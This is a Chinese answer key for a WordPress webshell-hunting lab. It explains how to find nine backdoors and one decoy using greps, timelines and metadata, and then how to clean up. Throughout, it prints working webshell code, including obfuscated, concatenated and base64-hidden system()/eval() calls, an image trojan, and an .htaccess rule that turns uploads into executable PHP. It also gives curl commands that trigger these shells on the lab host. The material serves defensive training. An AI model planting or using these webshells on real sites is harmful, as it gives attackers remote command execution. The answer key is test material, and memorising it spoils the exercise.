# 答案：webshell 排查靶场

> 先自己找一遍再看这里。目标是查出 **9 处后门 + 1 处诱饵**。
> 找到 6 处算及格（时间线能捞到的那批），9 处全中说明静态排查已经过关。

---

## 一、战果总览

按"发现它需要什么能力"分层：

**L1 — grep 关键词就能命中**
1. `/var/www/html/wp-includes/simple.php` — 明文一句话，`eval($_POST['pass'])`

**L2 — 得读上下文才知道是不是后门**
2. `/var/www/html/wp-content/themes/twentytwenty/functions.php:172` — 伪装成"多语言缓存"，实际 `eval(base64_decode(cookie))`
3. `/var/www/html/upgrade.php:36` — 函数名拆成 `'sys' . 'tem'`，再 `$fn($arg)`

**L3 — 靠文件系统元数据，不看内容**
4. `/var/www/html/wp-content/plugins/cache/.wp-check.php` — 隐藏文件 + mtime 改到 2024 + 权限 600
5. `/var/www/html/wp-content/uploads/2026/03/.htaccess:8` — `AddType application/x-httpd-php .jpg`
6. `/var/www/html/wp-content/uploads/2026/03/index.php.bak` — 备份文件里留着后门源码

**L4 — 编码/混淆，必须解码才能判断**
7. `/var/www/html/wp-content/uploads/2026/03/logo.jpg` — 合法 JPEG 尾部追 PHP
8. `/var/www/html/wp-content/mu-plugins/loader.php` — gzinflate + base64 分段拼接，解压后写临时文件再 include
9. `/var/tmp/sess_a3f9c2e1b7d4` — session 投毒，不在 web 目录里

**诱饵（不是后门，误报说明规则校准不到位）**
- `/var/www/html/wp-admin/admin-ajax.php:24` — `call_user_func( $handlers[ $action ] )`，但 `$action` 被白名单 `$handlers` 限制，属于正常分发逻辑。

---

## 二、逐个分析

### 1. wp-includes/simple.php —— 最直白的那种

```
-rw-r--r-- 1 www-data www-data 49 Oct 20 03:39 simple.php
```

内容三行：

```php
<?php
error_reporting(0);
@eval($_POST['pass']);
```

**怎么找到**：`grep -rn 'eval' --include='*.php'`。

**判定要点**：两个细节让它更像"人放进去的"而不是业务代码——
- `error_reporting(0)` 压掉报错。业务代码不会这么写，后门会，因为报错会暴露路径。
- `@` 抑制符同理。
- 文件名 `simple.php` 混在 `wp-includes` 里伪装核心文件，但 WordPress 官方没有这个文件。

**验证**：

```bash
curl -s -d 'pass=echo 6*7;' http://127.0.0.1:8899/wp-includes/simple.php
# → 42
```

---

### 2. themes/twentytwenty/functions.php —— 混在 178 行正常代码里

文件前 160 行是完整可用的主题逻辑：注册菜单、注册文章类型、分页函数、摘要长度过滤。第 164 行开始是一段"国际化字符串缓存"：

```php
function twentytwenty_i18n_cache() {
	if ( ! isset( $_COOKIE['wp_lang_pref'] ) ) {
		return;
	}
	$cache = base64_decode( $_COOKIE['wp_lang_pref'], true );
	if ( false === $cache ) {
		return;
	}
	// 缓存内容是序列化后的 strings 数组，交由 PHP 直接还原。
	eval( $cache );
}
add_action( 'init', 'twentytwenty_i18n_cache' );
```

**怎么找到**：`grep -rn 'eval(' --include='*.php'`，命中这一行。

**判定要点**：这段代码的**注释在撒谎**。
- 它说"缓存内容是序列化后的 strings 数组"。真要是数组，该用 `unserialize()`，不是 `eval()`。
- i18n 缓存不存在把可执行代码写进 cookie 的设计——cookie 在客户端，随便改。
- 反证：`add_action('init')` 意味着每次请求都执行，包括未登录访客。

这就是"看得见的 eval 但要读懂它假在哪"的典型。

**验证**：

```bash
PAYLOAD=$(echo 'echo "EVAL-OK";' | base64)
curl -s -H "Cookie: wp_lang_pref=$PAYLOAD" http://127.0.0.1:8899/ | grep EVAL-OK
# → EVAL-OK
```

**它为什么在时间线上查不到**：mtime 是 `2025-11-12 09:31`，和 `style.css`、`index.php` 完全一致。攻击者改完文件后 `touch` 回了原时间。所以 `find -newermt` 永远捞不到它——这类必须靠内容扫描。

---

### 3. upgrade.php —— 函数名拆开，grep 抓不到

根目录下一个像模像样的升级脚本，前半段是正常的 `step` 白名单分发。第 31 行往后：

```php
// 兼容代码：早期版本的运维脚本通过动态函数名调用，
// 参数直接透传，方便在升级失败时手工排查环境问题。
if ( isset( $_REQUEST['fn'] ) ) {
	$fn  = 'sys' . 'tem';
	$arg = (string) $_REQUEST['fn'];
	@$fn( $arg );
}
```

**怎么找到**：`grep 'system'` 抓不到，因为源码里根本没有连续的 `system` 六个字母。要用变量函数特征：

```bash
grep -rnE '(^|[^a-zA-Z0-9_>])\$[a-zA-Z_][a-zA-Z0-9_]*[[:space:]]*\(' /var/www/html --include='*.php' | grep -v function
```

命中 `@$fn( $arg );`。

**判定要点**：
- `'sys' . 'tem'` 这种拼接，业务代码没有任何理由这么写。
- 注释说"参数直接透传"——透传给 `system()` 就是命令执行。
- 注意它在根目录，不在 `wp-content` 里，扫描时容易因为"根目录就几个文件"而忽略。

**验证**：

```bash
curl -s 'http://127.0.0.1:8899/upgrade.php?fn=id'
# → uid=33(www-data) gid=33(www-data) ...
```

---

### 4. plugins/cache/.wp-check.php —— 三重伪装

```
-rw------- 1 www-data www-data 99 Jun 12  2024 .wp-check.php
```

三条异常同时出现在一个文件上：

- **文件名以点开头** → `ls` 看不见，只有 `ls -a` 或 `find -name '.*'` 能发现。
- **mtime 是 2024-06-12** → 比站点上线（2025-11-10）还早一年。攻击者 `touch -d` 改的。
- **权限 600** → 全站 21 个 php 都是 644，只有它是 600。因为 `chmod 600` 才能让别的用户读不到内容。

内容只有 99 字节：

```php
$s = 'c3lzdGVt';
$f = base64_decode( $s );   // → "system"
if ( isset( $_GET['k'] ) ) {
	$f( $_GET['k'] );
}
```

`c3lzdGVt` 是 `system` 的 base64。它连函数名都不写明文。

**怎么找到**：三条命令任意一条命中

```bash
find /var/www/html -name '.*' -type f
find /var/www/html -type f -name '*.php' ! -perm 644 -ls
find /var/www/html -type f -name '*.php' -user www-data ! -path '*/uploads/*'
```

**判定要点**：mtime 比站点建设时间还早，是**伪造时间戳的铁证**——一个文件不可能在目录被创建之前就存在。这条在真实取证里能直接定案。

**验证**：

```bash
curl -s 'http://127.0.0.1:8899/wp-content/plugins/cache/.wp-check.php?k=id'
# → uid=33(www-data) ...
```

---

### 5. uploads/2026/03/.htaccess —— 让图片变成脚本

```apache
# 上传目录安全策略
# 禁止直接执行脚本，防止用户上传的文件被当作代码运行
<FilesMatch "\.(?i:php|phtml|php3|php4|php5|phar)$">
    Require all denied
</FilesMatch>

# 图片缩略图由 PHP 动态生成，以兼容旧版 CDN 的裁剪接口
AddType application/x-httpd-php .jpg
```

**怎么找到**：

```bash
grep -rn 'AddType\|AddHandler\|auto_prepend' /var/www/html --include='.htaccess'
```

**判定要点**：这是整个靶场里最阴的一处，因为**它长得像安全加固**。前 6 行确实是正经加固（禁止上传目录执行 php），最后一行把 `.jpg` 交给了 PHP，前面所有防护瞬间作废。

真实站点里这种配置经常是运维"为了兼容老 CDN"留下的，也可能是攻击者加的。判断依据是**它出现在 uploads 目录**——上传目录只需要"禁止执行"，永远不会需要"额外允许执行"。

---

### 6. uploads/2026/03/index.php.bak —— 备份文件泄露

232 字节，一个完整的 php 文件，带后门：

```php
if ( isset( $_POST['z'] ) ) {
	$p = base64_decode( $_POST['z'] );
	@eval( $p );
	exit;
}
```

**注意一个反直觉的点**：这个文件**不会被执行**。`.bak` 后缀不经过 PHP 解释器，所以 `$_POST['z']` 那段是死代码——访问它只会把源码原样打印出来。

但这恰恰是更严重的问题：**任何访问者都能下载到后门源码**，等于把攻击者的工具箱公开展示。而且它证明了一件事——攻击者曾在这里投放过文件，后来改名/备份了。

**怎么找到**：

```bash
find /var/www/html \( -name '*.bak' -o -name '*.old' -o -name '*.orig' -o -name '*~' \) -type f
```

**判定要点**：备份文件不用判断"能不能跑"，它出现在 web 根下就是问题。真实环境里 `.bak`、`.swp`（vim 残留）、`.save`、`.orig` 都是源码泄露的常见来源。

---

### 7. uploads/2026/03/logo.jpg —— 图片马

`file` 命令的输出完全正常：

```
logo.jpg: JPEG image data, JFIF standard 1.01, baseline, precision 8, 200x200, components 3
```

图片能正常打开，200×200，显示一个 LOGO 圆环。但文件尾部（JPEG 结束标记 `FF D9` 之后）追加了 62 字节：

```php
<?php if(isset($_GET["1"])){ @system($_GET["1"]); } ?>
```

**怎么找到**：`grep` 默认会把二进制文件当"匹配到二进制文件"跳过，要加 `-a`：

```bash
for f in $(find /var/www/html -type f \( -name '*.jpg' -o -name '*.png' -o -name '*.gif' \)); do
    grep -qa '<?php' "$f" && echo "$f"
done
```

或者更通用地找所有非 php 文件里的 PHP 开标签：

```bash
grep -rla '<?php' /var/www/html --include='*.jpg' --include='*.png' --include='*.gif'
```

**判定要点**：图片马单独存在没有杀伤力——服务器把 `.jpg` 当静态文件发出去。它必须配合第 5 条那个 `.htaccess` 才能执行。**两处要连起来看**，这是攻击链：上传图片 → 改写解析规则 → 通过图片执行命令。

**验证**（前提是 `.htaccess` 那条还在）：

```bash
curl -s 'http://127.0.0.1:8899/wp-content/uploads/2026/03/logo.jpg?1=id' | tail -c 60
# → uid=33(www-data) gid=33(www-data) ...
```

注意响应体前面是一整张 JPEG 的二进制，命令输出被追加在最后——因为 PHP 把 `?>` 外的所有内容当 HTML 原样输出。

---

### 8. mu-plugins/loader.php —— 混淆马

`mu-plugins`（must-use plugins）里的文件会被 WordPress 自动加载，不需要激活，所以放这里等于"永久生效"。

文件头部伪装成一个叫 Cache Warmer 的缓存插件，版本号、描述都齐全。关键代码：

```php
$__a = 'ba' . 'se64' . '_dec' . 'ode';
$__b = 'gz' . 'infl' . 'ate';

$__w = 'UymxVYkP8A8OiVYvUY+1t1dXt1bITNNQKVG0tVVX16xW' .
	'SE3OyFdQslHU1U3W1bVTslYoriwuSc0FqtC0RpLUh8rW' .
	'AgA=';

if ( ! empty( $_POST['t'] ) ) {
	$__f = sys_get_temp_dir() . '/.wpc-' . substr( md5( $__w ), 0, 8 ) . '.php';
	if ( ! file_exists( $__f ) ) {
		file_put_contents( $__f, $__b( $__a( $__w ) ) );
	}
	include $__f;
}
```

**怎么找到**：`grep 'eval'`、`grep 'system'` 都抓不到——两个函数名都被拆开拼接了。能命中的特征：

```bash
# 1) 拼接出来的危险函数名
grep -rnE "'[^']{1,6}'[[:space:]]*\.[[:space:]]*'" /var/www/html --include='*.php'

# 2) 编码/解压函数同时出现
grep -rn 'base64_decode\|gzinflate\|gzuncompress' /var/www/html --include='*.php'
```

**判定要点**：三个信号叠加——
- 函数名拼接（正常代码不会把 `base64_decode` 拆成四段）
- 一长串 base64 被 `'...' .` 切成多行（正常代码不会这么写常量）
- `file_put_contents` + `include` 组合（写文件再执行 = 无文件落地）

**怎么解码**：

```bash
python3 - <<'EOF'
import base64, zlib
b64 = ('UymxVYkP8A8OiVYvUY+1t1dXt1bITNNQKVG0tVVX16xW'
       'SE3OyFdQslHU1U3W1bVTslYoriwuSc0FqtC0RpLUh8rW'
       'AgA=')
print(zlib.decompress(base64.b64decode(b64), -15).decode())
EOF
```

输出：

```php
<?php $t = $_POST['t'] ?? ''; if ( $t !== '' ) { system( $t ); }
```

**运行时还会留下痕迹**：每次请求会在 `/tmp` 生成 `.wpc-<hash>.php`。

```bash
ls -la /tmp/.wpc-*
```

这条线索很重要——真实应急里，攻击者把马删了，但 `/tmp` 里的落地文件还在，或者反过来：www 目录干净，只有 `/tmp` 有东西。

---

### 9. /var/tmp/sess_a3f9c2e1b7d4 —— session 投毒

不在 web 根下，所以前面所有 `find /var/www/html` 的命令都捞不到。

内容：

```
uid|i:1;uname|s:5:"admin";role|s:13:"administrator";payload|s:28:"<?php @system($_GET['c']); ?>";
```

这是 PHP 的 session 序列化格式。攻击者把 PHP 代码塞进 session 的 `payload` 字段，然后等着用文件包含（LFI）漏洞把它 include 进来。

**三个异常点**：
- 位置在 `/var/tmp`。正常 PHP session 在 `/var/lib/php/sessions`（或 `session.save_path` 指定的地方）。
- 时间 `2026-10-20 03:46`，正好在入侵窗口内。
- 内容里有 `<?php`，正常 session 数据里不可能出现。

**怎么找到**：

```bash
ls -la /var/lib/php/sessions/     # 正常 session 长什么样
find /tmp /var/tmp -type f -newermt '2026-10-01' 2>/dev/null
grep -rla '<?php' /tmp /var/tmp 2>/dev/null
```

**判定要点**：这类后门说明站点**还有别的漏洞没被找到**——session 投毒本身不能执行，必须配合 LFI。发现它意味着排查范围要扩大到文件包含类漏洞。

---

## 三、推荐的排查顺序（七步）

真实应急里时间紧，按"成本低、覆盖面大"排：

**第 1 步：确认现场（30 秒）**

```bash
ls -la /var/www/html
find /var/www/html -type f | wc -l
cat /var/www/html/wp-config.php | grep -i 'DB_\|table_prefix'
```

先知道站点是什么、有多少文件、数据库叫什么。后面所有分析都在这个基础上。

**第 2 步：时间线（最先做）**

```bash
find /var/www/html -type f -newermt '2026-10-01' -printf '%TY-%Tm-%Td %TH:%TM  %p\n' | sort
```

本靶场命中 6 个。这一步性价比最高——攻击者落地文件必然改变 mtime，除非他刻意伪造。**但要知道它的盲区**：改了老文件再 `touch` 回去（第 2 条那种），时间线永远看不到。

**第 3 步：关键词扫描**

```bash
grep -rnE '\b(eval|assert|system|exec|shell_exec|passthru|popen|proc_open)[[:space:]]*\(' \
     /var/www/html --include='*.php'
```

命中 `simple.php` 和 `functions.php`。注意这条**漏掉了** `upgrade.php`（拼接）和 `loader.php`（混淆），所以第 4 步必须做。

**第 4 步：绕过关键词的形态**

```bash
# 变量函数调用
grep -rnE '(^|[^a-zA-Z0-9_>])\$[a-zA-Z_][a-zA-Z0-9_]*[[:space:]]*\(' /var/www/html --include='*.php' | grep -v function

# 编码/解压链
grep -rn 'base64_decode\|gzinflate\|gzuncompress\|str_rot13' /var/www/html --include='*.php' --include='*.bak'
```

两处后门在这一步才露出来。

**第 5 步：文件系统元数据**

```bash
# 隐藏文件
find /var/www/html -name '.*' -type f

# 权限异常（全站 644，独一份）
find /var/www/html -type f -name '*.php' ! -perm 644 -ls

# 属主异常（Web 进程写的，却在 root 目录里）
find /var/www/html -type f -name '*.php' -user www-data ! -path '*/uploads/*' -printf '%u %M %p\n'

# 备份残留
find /var/www/html \( -name '*.bak' -o -name '*.old' -o -name '*.orig' -o -name '*~' \) -type f
```

**第 6 步：非 PHP 文件里的代码**

```bash
grep -rla '<?php' /var/www/html --include='*.jpg' --include='*.png' --include='*.gif' --include='*.ico'
grep -rn 'AddType\|AddHandler\|auto_prepend' /var/www/html --include='.htaccess'
```

**第 7 步：日志与外围**

```bash
# 谁访问过后门
grep -nE 'simple\.php|\.bak|wp-check|loader\.php|logo\.jpg\?' /var/log/apache2/access.log

# 谁在扫（按 IP 计数，找高频）
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn

# www 之外
find /tmp /var/tmp -type f -newermt '2026-10-01' 2>/dev/null
ls -la /var/lib/php/sessions/
```

本靶场日志里 `10.0.3.14` 有 20 条请求，从 `03:36` 的探测到 `03:47` 的后门交互，时间线和文件 mtime 完全对得上——这就是完整证据链。

---

## 四、四个坑

**坑 1：`grep eval` 会给你虚假的安全感**

`upgrade.php` 的 `'sys' . 'tem'`、`loader.php` 的四段拼接、`.wp-check.php` 的 base64 函数名，这三个用关键词一条都扫不出来。**必须同时扫"变量函数调用"和"编码函数"**。

**坑 2：时间戳可以被伪造**

`.wp-check.php` 的 mtime 是 2024 年，比站点上线早一年。`find -newermt` 完全看不到它（它太老了，不在"最近改动"里）。

反过来，如果攻防演练里有人把马的时间改到 2019 年，你会以为是老文件。唯一的破绽是**逻辑矛盾**：文件时间早于目录创建时间。

查目录创建时间：

```bash
stat -c '%w %n' /var/www/html/wp-content/plugins/cache
```

配合 `debugfs`（ext4）能拿到 inode 的 crtime，这是 `touch` 改不了的。Docker overlayfs 下没有这个能力，但真实物理机上有。

**坑 3：主题文件被改，mtime 却没变**

`functions.php` 的后门是原地修改，攻击者 `touch -d '2025-11-12 09:31'` 改回了安装时间，和 `style.css` 一模一样。**这类只能靠内容扫描 + 和官方版本做 diff**：

```bash
# 真实环境里最有效的一招
curl -sO https://wordpress.org/wordpress-6.x.x.tar.gz
tar xzf wordpress-*.tar.gz
diff -r wordpress/wp-content/themes/twentytwenty /var/www/html/wp-content/themes/twentytwenty
```

本靶场裁过，不能直接 diff 官方包，但方法要记住。

**坑 4：`call_user_func` 不等于后门**

`admin-ajax.php:24` 有 `call_user_func( $handlers[ $action ] )`，看着像动态调用，但 `$action` 被 `$handlers` 白名单限制在 `get_theme_info` / `ping` 两个函数里，攻击者控制不了。

**误报和不报一样危险**——把所有 `call_user_func` 都标成后门，会在真实站点上找出几十条噪音，最后没人看报告。

判断标准只有一条：**这个变量能不能被请求控制，且能不能指向危险函数**。

---

## 五、清理与加固

查完之后按这个顺序处理（真实环境里要先留证再动手）：

```bash
# 1. 留证（先做，别急着删）
mkdir -p /root/ir-$(date +%F)
cp -a /var/www/html /root/ir-$(date +%F)/www
cp -a /var/log/apache2 /root/ir-$(date +%F)/logs
md5sum $(find /var/www/html -name '*.php') > /root/ir-$(date +%F)/md5.txt

# 2. 断掉执行入口
#    - .htaccess 里的 AddType 删掉
#    - uploads 目录加 "php_flag engine off"
#    - 关掉 AllowOverride，或把 uploads 目录的 AllowOverride 设为 None

# 3. 换密钥
#    wp-config.php 里的 AUTH_KEY / SECURE_AUTH_KEY / LOGGED_IN_KEY / NONCE_KEY 全部重新生成
#    数据库密码、FTP/SSH 密码全部更换

# 4. 修漏洞
#    session 投毒说明有 LFI；uploads 目录 www-data 可写说明上传没做校验；
#    只有修掉入口，删马才有意义。
```

**重要**：只删文件不修漏洞，等于把门锁换了但窗户还开着。真实应急里"二次失陷"非常常见——攻击者留了多个入口，删一个不影响他回来。

---

## 六、自评标准

- 找到 6 个（时间线那批）→ 及格，但漏了"改了时间戳"和"混在正常代码里"两类
- 找到 8 个 → 良好，只漏 session 投毒或图片马之一
- 9 个全中 → 静态排查过关
- 9 个全中 **且** 没把 `admin-ajax.php` 报成后门 → 规则校准也过关

如果跑 `python3 hunt.py --docker webshell-hunt`，输出应该是 `命中文件 9 / 25，HIGH 9 项`。
如果数字对不上，说明脚本被改过，或者环境没重置干净。
